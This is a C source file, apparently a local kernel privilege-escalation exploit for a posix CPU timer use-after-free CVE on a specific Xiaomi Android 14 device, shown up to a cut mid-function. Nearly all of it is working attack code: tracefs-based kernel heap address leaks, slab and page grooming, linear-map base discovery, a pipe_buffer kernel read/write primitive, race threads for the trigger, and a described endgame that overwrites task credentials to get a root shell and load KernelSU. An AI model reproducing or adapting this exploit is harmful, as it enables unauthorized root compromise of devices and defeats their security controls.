/*
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : Xiaomi aurora (SM8650), Android 14
 * Kernel : 6.1.75-android14-11-gfa9b7054770e-mi
 * Build  : AQ3A.240627.003
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * Ported from the 6.12.69 (android16-6) profile.  Every address and struct
 * offset below was re-derived from this image's .symtab, .BTF and
 * disassembly; the 6.1 cred layout differs (4-byte usage, uid at 4), the
 * fake erase must stay self-parent so the exit loop's rb_next() returns
 * NULL, and uid/euid need two repair writes afterwards.
 *
 * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
 * The trigger, slab layout and offsets are the same; the do_timer_create
 * call site and the tracefs event ids are per-build and are re-derived here.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
 *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
 *     blob.  The worker execs ksud late-load, which resolves the installed
 *     manager's libksud.so and loads the matching android14-6.1 module.
 *     The parent parks with its socket buffers holding the fake cred page.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <grp.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define SOCKBUF 8192

/* All kernel-build-specific constants (sites, cache sizes, struct offsets,
 * link-time symbols) live in offsets.h; only exploit tuning stays here. */
#include "offsets.h"
#include "device_check.h"

/* (selinux_state / panic_on_warn / workqueue-UMH constants: offsets.h) */
/* (umh struct layouts + ROOT_UMH_* page slots: offsets.h) */
/* (DEFEX creds_hash, cred/task field offsets, init_* symbols: offsets.h) */

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_slide_set;
static int g_held;
/*
 * True while the root child runs with task->cred pointing into the fake
 * pool page: that page must not be freed (park_forever skips the drain).
 */
static int g_cred_live;
static int g_fake_stage;
static unsigned long long g_child_task;
static int g_umh_stage;
static unsigned g_t_page_alloc, g_t_page_free;

/* pipe_buffer kernel r/w primitive + UMH injection state. */
static unsigned long long g_pipe_addr;        /* leaked pipe_inode_info */
static unsigned long long g_pipe_bufs;        /* its original bufs array */
static unsigned long long g_pipe_target_page; /* vmemmap struct page * */
static unsigned int g_pipe_target_off;
static int g_pipe_self;
static int g_pipe_write;
static int g_umh_pipe;
static int g_umh_dry;
static unsigned long long g_umh_wq, g_umh_pwq, g_umh_pool;
/* Running kernel image phys base (unslid base + slide) and DRAM phys
 * base; see offsets.h. */
static unsigned long long g_kimage_phys;
static unsigned long long g_memstart = MEMSTART_ADDR;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    /* [+ms] elapsed-since-first-log prefix: makes the per-stage cost
     * (leak, each plant, each repair, late-load) visible in the log so
     * the slow spots can be measured instead of guessed. */
    static struct timespec t0;
    struct timespec now;
    va_list ap;

    clock_gettime(CLOCK_MONOTONIC, &now);
    if (!t0.tv_sec)
        t0 = now;
    long long ms = (long long)(now.tv_sec - t0.tv_sec) * 1000LL +
                   (long long)(now.tv_nsec - t0.tv_nsec) / 1000000LL;
    printf("[+%5lld.%03llds] ", ms / 1000LL, ms % 1000LL);

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    /*
     * The per-cpu trace buffer defaults to a few kB and the kmem events
     * flood it in milliseconds on a busy system, which starves every scan
     * (discover_page_types sees partial alloc/free pairs).  Grow it first
     * so the payload is self-contained instead of relying on the app to
     * have done it.
     */
    wr(TR "/buffer_size_kb", "8192\n");
    /*
     * Event triggers persist in tracefs across runs (and even reboots of
     * the tracing state), and re-registering a trigger that already exists
     * fails with EEXIST.  A leftover "disable_event:kmem:kmalloc" from an
     * earlier run keeps firing on rss_stat and silently turns the pipe
     * leak blind, so remove every form first (ignore failures), then
     * register the enables.  The bare syntax is correct; the ":unlimited"
     * suffix is just how tracefs displays the parsed trigger count.
     */
    static const char *evs[] = {
        "!disable_event:kmem:kmalloc\n",
        "!disable_event:kmem:kmem_cache_alloc\n",
        "!disable_event:kmem:kmem_cache_alloc_node\n",
        "!disable_event:kmem:mm_page_free\n",
        "!disable_event:kmem:mm_page_alloc\n",
        "!enable_event:kmem:kmem_cache_alloc\n",
        "!enable_event:kmem:kmem_cache_alloc_node\n",
        "!enable_event:kmem:mm_page_free\n",
        "!enable_event:kmem:mm_page_alloc\n",
        "!enable_event:kmem:kmalloc\n",
        "enable_event:kmem:kmem_cache_alloc\n",
        /* dup_task_struct() allocates via kmem_cache_alloc_node; without
         * this event the child task_struct address is never traced. */
        "enable_event:kmem:kmem_cache_alloc_node\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

/*
 * kmem:kmalloc is deliberately not enabled globally: it fires for every
 * kmalloc on the system and floods the trace buffer, which buries the
 * page events discover_page_types needs.  The pipe leak wants it for a
 * few milliseconds only (pipe_inode_info is a kmalloc object).  Switching
 * between the enable and disable trigger forms needs the other form
 * removed first -- re-registering conflicts with EEXIST.
 */
static void set_pipe_events(int on)
{
    const char *want = on ? "enable_event:kmem:kmalloc\n"
                          : "disable_event:kmem:kmalloc\n";

    /*
     * Switching between the enable and disable trigger forms needs the
     * other form removed first (re-registering conflicts with EEXIST),
     * and the whole dance is verified from the trigger file: a leftover
     * trigger from a killed run silently keeps kmalloc off and the pipe
     * leak then sees nothing.
     */
    for (int t = 0; t < 3; t++)
    {
        FILE *f;
        char line[128];
        int ok = 0;

        wr(TR "/events/kmem/rss_stat/trigger",
           on ? "!disable_event:kmem:kmalloc\n"
              : "!enable_event:kmem:kmalloc\n");
        wr(TR "/events/kmem/rss_stat/trigger",
           on ? "!enable_event:kmem:kmalloc\n"
              : "!disable_event:kmem:kmalloc\n");
        wr(TR "/events/kmem/rss_stat/trigger", want);
        f = fopen(TR "/events/kmem/rss_stat/trigger", "r");
        if (f)
        {
            while (fgets(line, sizeof(line), f))
                if (!strncmp(line, want, strlen(want) - 1))
                    ok = 1;
            fclose(f);
        }
        if (ok)
        {
            /*
             * The trigger only takes effect on the next rss_stat event;
             * force one so the enable/disable lands before the traced
             * window instead of somewhere inside it.
             */
            void *q = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (q != MAP_FAILED)
            {
                *(volatile char *)q = 1;
                munmap(q, PAGE);
            }
            usleep(1000);
            return;
        }
        logf("[!] kmalloc trigger %s not registered, retry %d\n",
             on ? "enable" : "disable", t + 1);
        usleep(20000);
    }
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    /*
     * Identify the k_itimer allocation site dynamically.  The KASLR slide on
     * this kernel has sub-2MB granularity, so the low 21 bits of the call
     * site are not constant across boots and must not be compared against a
     * hard-coded value.  Instead, the target allocations (CLOCK_*_CPUTIME
     * timer_create) all come from a single call site (do_timer_create), so
     * the dominant site among this pid's TIMER_ALLOC kernel allocations is
     * that call site.
     */
    unsigned long long cand_site[8];
    int cand_cnt[8];
    int nc = 0;

    for (int k = 0; k < 8; k++)
        cand_site[k] = 0, cand_cnt[k] = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;
        int f = 0;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        for (int k = 0; k < nc; k++)
            if (cand_site[k] == site)
            {
                cand_cnt[k]++;
                f = 1;
                break;
            }
        if (!f && nc < 8)
        {
            cand_site[nc] = site;
            cand_cnt[nc] = 1;
            nc++;
        }
    }
    if (!nc)
        return 0;
    {
        int best = 0;

        for (int k = 1; k < nc; k++)
            if (cand_cnt[k] > cand_cnt[best])
                best = k;
        unsigned long long dom = cand_site[best];
        int cnt = 0;

        for (size_t i = 8; i + 32 <= n; i += 4)
        {
            unsigned long long site, ptr;

            if (u32(b, i - 4) != (unsigned)pid)
                continue;
            site = u64(b, i);
            if (site != dom)
                continue;
            ptr = u64(b, i + 8);
            if (u64(b, i + 16) != TIMER_ALLOC ||
                u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
                continue;
            if (!cnt && first_site)
                *first_site = site;
            if (cnt < max)
                out[cnt++] = ptr;
        }
        return cnt;
    }
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        logf("  [credscan] cred=%#llx site_low=%#llx (n=%d)\n", ptr,
             site & 0x1fffff, found);
        /*
         * Keep the FIRST allocation: it is prepare_exec_creds(), the cred
         * that commit_creds() installs as the child's live cred.  Later
         * same-size allocs from the child are transient (alloc/free churn)
         * and are already freed when the write fires.
         */
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out,
                            unsigned long long expect_site)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        /*
         * The KASLR slide on this kernel has 64KB granularity, so a
         * hard-coded low-21-bit filter never matches.  Match the exact
         * runtime call site instead: dup_task_struct's
         * kmem_cache_alloc_node return address plus this boot's slide.
         */
        if (expect_site && site != expect_site)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        /* task_struct_cachep object_size is sizeof(struct task_struct),
         * 0x12c0; it is 64-byte aligned so bytes_alloc is the same. */
        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

/*
 * pipe_inode_info leak for the pipe_buffer r/w primitive: after pipe() the
 * kmem trace shows kmalloc(pipe_inode_info) (req 0xb8 / alloc 0xc0) and
 * the bufs array (req 0x280).  Both addresses are needed: the plant
 * repoints pipe->bufs, and the restore writes the original back.
 */
static void scan_pipe_alloc(const unsigned char *b, size_t n, int pid)
{
    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long ptr, req, alloc, site;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        req = u64(b, i + 8);
        alloc = u64(b, i + 16);
        site = u64(b, i - 8);
        if (!is_kernel_ptr(ptr))
            continue;
        if (req == 0xb8 && alloc == 0xc0)
        {
            g_pipe_addr = ptr;
            logf("[pipeleak] info=%#llx site=%#llx\n", ptr, site);
        }
        else if (req == 0x280)
        {
            g_pipe_bufs = ptr;
            logf("[pipeleak] bufs=%#llx alloc=%#llx site=%#llx\n",
                 ptr, alloc, site);
        }
    }
}

/* Order-0 mm_page_alloc pfns for this pid, in trace order. */
static int scan_page_alloc_pfns(const unsigned char *b, size_t n, int pid,
                                unsigned long long *out, int max)
{
    int found = 0;

    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        unsigned long long pfn;
        unsigned int order;
        int dup = 0;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        order = u32(b, i + 8);
        if (order != 0)
            continue;
        pfn = u64(b, i);
        if (pfn >= (1ULL << 30))
            continue;
        for (int k = 0; k < found; k++)
            if (out[k] == pfn)
                dup = 1;
        if (dup)
            continue;
        logf("[pipepfn] pfn=%#llx order=%u idx=%d\n", pfn, order, found);
        if (found < max)
            out[found++] = pfn;
    }
    return found;
}

/*
 * The kernel image's physical load address (unslid base + slide) is a
 * bootloader constant; see offsets.h.  It is validated read-only by the
 * umh dry-run candidate loop instead of being parsed at runtime.
 */

/* vmemmap struct page pointer for a linear-map address. */
static unsigned long long spage_of_linear(unsigned long long addr)
{
    unsigned long long phys = addr - g_base;
    unsigned long long pfn = phys >> 12;

    return VMEMMAP_BASE + (pfn - (g_memstart >> 12)) * STRUCT_PAGE_SIZE;
}

/* Linear-map alias of a kernel-image symbol (slide included via iomem). */
static unsigned long long alias_of_kimg(unsigned long long sym)
{
    return g_base + g_kimage_phys + (sym - KERNEL_VA_BASE);
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        logf("[base-diag] made=%d timer_allocs(c)=%d order1_pfn(rn)=%d page_alloc_id=%u\n",
             made, c, rn, g_t_page_alloc);
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

/*
 * Drain the posix_timers_cache SLUB partial list.  If the victim slab stays
 * on the partial list instead of returning to the buddy allocator, our
 * order-1 reclaim can never land on it.  Freeing every held timer and then
 * churning a large batch (alloc+free) empties the partial slabs so the next
 * freed victim slab goes back to the buddy, where the spray picks it up.
 */
static void drain_timers(void)
{
    struct sigevent ev;
    static timer_t tmp[4096];

    if (g_prefill)
    {
        for (int i = 0; i < PREFILL_TIMERS; i++)
            timer_delete(g_prefill[i]);
        free(g_prefill);
        g_prefill = NULL;
    }
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < 1024; i++)
        timer_create(CLOCK_MONOTONIC, &ev, &tmp[i]);
    for (int i = 0; i < 1024; i++)
        timer_delete(tmp[i]);
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 25000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
